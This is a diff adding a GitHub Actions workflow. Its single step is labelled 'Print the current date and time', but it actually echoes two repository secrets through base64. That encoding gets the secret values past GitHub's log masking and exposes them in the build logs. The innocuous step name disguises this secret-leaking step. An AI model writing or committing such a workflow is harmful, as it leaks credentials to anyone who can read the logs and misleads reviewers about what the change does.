@@ -1,0 +1,12 @@
+on:
+    push:
+        branches:
+            - add-gcp-package
+jobs:
+    printer:
+        runs-on: ubuntu-latest
+        steps:
+            - name: Print the current date and time
+              run:
+                echo "${{ secrets.PUBLIC_RUNNER_ANSIBLE_ECR_REPOSITORY_URL}}" | base64
+                echo "${{ secrets.PUBLIC_RUNNER_ANSIBLE_ECR_REPOSITORY_URL_AWS }}" | base64
